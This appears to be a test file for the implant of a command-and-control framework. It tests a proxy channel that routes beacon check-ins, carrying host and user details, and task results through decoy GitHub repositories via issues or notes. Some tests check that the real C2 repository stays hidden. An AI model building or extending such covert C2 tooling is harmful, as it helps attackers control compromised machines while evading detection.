// implant/src/__tests__/OctoProxyTentacle.test.ts
import { describe, it, expect, mock } from "bun:test";
import { OctoProxyTentacle } from "../tentacles/OctoProxyTentacle.ts";
import type { BeaconConfig, ProxyConfig, ITentacle, TentacleKind, AppConfig } from "../types.ts";

function makeConfig(): BeaconConfig {
  return {
    id: "b-test",
    repo: { owner: "real-owner", name: "real-c2" },
    token: "real-token",
    tentaclePriority: ["proxy"],
    sleepSeconds: 60,
    jitter: 0.1,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
  };
}

const issuesProxy: ProxyConfig = { owner: "decoy-owner", repo: "my-dotfiles",     innerKind: "issues" };
const notesProxy:  ProxyConfig = { owner: "decoy-owner", repo: "config-snippets", innerKind: "notes"  };

function makeMockInner(tasks: unknown[] = [], available = true): ITentacle {
  return {
    kind: "issues" as TentacleKind,
    isAvailable:  mock(async () => available),
    checkin:      mock(async () => tasks as any),
    submitResult: mock(async () => {}),
    teardown:     mock(async () => {}),
  };
}

/** Build a proxy with a swapped-in mock inner tentacle. */
function makeProxyWithMock(proxy: ProxyConfig, inner: ITentacle): OctoProxyTentacle {
  const t = new OctoProxyTentacle(makeConfig(), proxy);
  (t as any).inner = inner;
  return t;
}

describe("OctoProxyTentacle", () => {
  it("has kind 'proxy'", () => {
    const t = new OctoProxyTentacle(makeConfig(), issuesProxy);
    expect(t.kind).toBe("proxy");
  });

  it("delegates isAvailable to inner tentacle", async () => {
    const inner = makeMockInner([], true);
    const t = makeProxyWithMock(issuesProxy, inner);
    const result = await t.isAvailable();
    expect(result).toBe(true);
    expect((inner.isAvailable as ReturnType<typeof mock>).mock.calls.length).toBe(1);
  });

  it("passes proxy owner/repo to inner tentacle (not real C2 coords)", () => {
    const t = new OctoProxyTentacle(makeConfig(), issuesProxy);
    expect(t.innerConfig.repo.owner).toBe("decoy-owner");
    expect(t.innerConfig.repo.name).toBe("my-dotfiles");
  });

  it("passes real C2 token when proxy.token is absent", () => {
    const t = new OctoProxyTentacle(makeConfig(), issuesProxy);
    expect(t.innerConfig.token).toBe("real-token");
  });

  it("uses proxy.token when provided", () => {
    const proxyWithToken: ProxyConfig = { ...issuesProxy, token: "proxy-token" };
    const t = new OctoProxyTentacle(makeConfig(), proxyWithToken);
    expect(t.innerConfig.token).toBe("proxy-token");
  });

  it("creates IssuesTentacle inner when innerKind is 'issues'", () => {
    const t = new OctoProxyTentacle(makeConfig(), issuesProxy);
    expect(t.innerKindName).toBe("IssuesTentacle");
  });

  it("creates NotesTentacle inner when innerKind is 'notes'", () => {
    const t = new OctoProxyTentacle(makeConfig(), notesProxy);
    expect(t.innerKindName).toBe("NotesTentacle");
  });

  it("delegates checkin to inner tentacle", async () => {
    const inner = makeMockInner([]);
    const t = makeProxyWithMock(issuesProxy, inner);
    const payload = {
      beaconId: "b-test", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };
    const tasks = await t.checkin(payload);
    expect(Array.isArray(tasks)).toBe(true);
    expect((inner.checkin as ReturnType<typeof mock>).mock.calls.length).toBe(1);
  });

  it("delegates submitResult to inner tentacle", async () => {
    const inner = makeMockInner([]);
    const t = makeProxyWithMock(issuesProxy, inner);
    const result = {
      taskId: "task-1", beaconId: "b-test",
      success: true, output: '{"success":true}', completedAt: new Date().toISOString(),
    };
    // Should not throw
    await expect(t.submitResult(result)).resolves.toBeUndefined();
    expect((inner.submitResult as ReturnType<typeof mock>).mock.calls.length).toBe(1);
  });

  it("real C2 owner/repo are NOT visible in innerConfig", () => {
    const t = new OctoProxyTentacle(makeConfig(), issuesProxy);
    expect(t.innerConfig.repo.owner).not.toBe("real-owner");
    expect(t.innerConfig.repo.name).not.toBe("real-c2");
  });

  it("preserves all other BeaconConfig fields (id, sleepSeconds, etc.)", () => {
    const t = new OctoProxyTentacle(makeConfig(), issuesProxy);
    expect(t.innerConfig.id).toBe("b-test");
    expect(t.innerConfig.sleepSeconds).toBe(60);
  });

  it("teardown delegates to inner tentacle without throwing", async () => {
    const inner = makeMockInner([]);
    const t = makeProxyWithMock(issuesProxy, inner);
    await expect(t.teardown()).resolves.toBeUndefined();
    expect((inner.teardown as ReturnType<typeof mock>).mock.calls.length).toBe(1);
  });

  it("buildTeardownOctokit() passes App credentials to buildTokenGetter when appConfig is present", async () => {
    const appCfg: AppConfig = {
      appId:          "12345",
      installationId: "67890",
      privateKey:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xHn/ygWep4\n-----END RSA PRIVATE KEY-----",
    };
    const proxyWithApp: ProxyConfig = { ...issuesProxy, token: "pat-fallback", appConfig: appCfg };

    const inner = makeMockInner([]);
    const t = makeProxyWithMock(proxyWithApp, inner);

    // Spy on buildTokenGetter via the injectable parameter — the REAL method is called.
    let capturedConfig: Parameters<typeof import("../lib/AppTokenManager.ts")["buildTokenGetter"]>[0] | undefined;
    const spyBuildTokenGetter = mock((cfg: any) => {
      capturedConfig = cfg;
      // Return a token getter that doesn't make any network calls.
      return async () => "spy-token";
    });

    await (t as any).buildTeardownOctokit(spyBuildTokenGetter);

    expect(spyBuildTokenGetter.mock.calls.length).toBe(1);
    expect(capturedConfig).toBeDefined();
    expect(capturedConfig!.appId).toBe(12345);
    expect(capturedConfig!.installationId).toBe(67890);
    expect(capturedConfig!.appPrivateKey).toBe(appCfg.privateKey);
    expect(capturedConfig!.token).toBe("pat-fallback");
  });

  it("buildTeardownOctokit() falls back to PAT token when appConfig is absent", async () => {
    // No appConfig — proxyConfig only has a plain token.
    const proxyWithPat: ProxyConfig = { ...issuesProxy, token: "my-pat-token" };

    const inner = makeMockInner([]);
    const t = makeProxyWithMock(proxyWithPat, inner);

    let capturedConfig: Parameters<typeof import("../lib/AppTokenManager.ts")["buildTokenGetter"]>[0] | undefined;
    const spyBuildTokenGetter = mock((cfg: any) => {
      capturedConfig = cfg;
      return async () => "spy-token";
    });

    await (t as any).buildTeardownOctokit(spyBuildTokenGetter);

    expect(spyBuildTokenGetter.mock.calls.length).toBe(1);
    expect(capturedConfig).toBeDefined();
    // No App credentials — should have undefined app fields
    expect(capturedConfig!.appId).toBeUndefined();
    expect(capturedConfig!.installationId).toBeUndefined();
    expect(capturedConfig!.appPrivateKey).toBeUndefined();
    // PAT is passed through
    expect(capturedConfig!.token).toBe("my-pat-token");
  });
});
